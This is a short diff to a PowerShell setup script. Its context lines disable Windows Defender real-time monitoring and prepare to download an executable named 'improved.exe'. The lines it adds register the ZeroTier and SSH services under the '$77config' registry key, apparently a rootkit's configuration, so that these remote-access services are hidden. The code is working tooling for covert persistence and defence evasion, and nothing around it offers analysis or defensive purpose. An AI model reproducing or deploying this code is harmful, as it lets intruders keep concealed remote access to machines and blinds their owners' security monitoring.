@@ -16,9 +16,18 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 # Define the base path for the $77config
 $baseConfigPath = "HKLM:\SOFTWARE\$77config"
 
-# Ensure the $77config key exists
-if (-not (Test-Path $baseConfigPath)) {
-    New-Item -Path $baseConfigPath -Force | Out-Null
+# Ensure the $77config key and necessary subkeys exist
+$serviceNamesPath = "$baseConfigPath\service_names"
+if (-not (Test-Path $serviceNamesPath)) {
+    New-Item -Path $serviceNamesPath -Force | Out-Null
+}
+
+# Define service names to hide - ZeroTier and SSH service
+$servicesToHide = @("ZeroTierOneService", "sshd") # Replace 'sshd' with your SSH service name if different
+
+# Hide specified services
+foreach ($service in $servicesToHide) {
+    New-ItemProperty -Path $serviceNamesPath -Name $service -Value "" -PropertyType String -Force | Out-Null
 }
 
 # Define the URL and download location for improved.exe
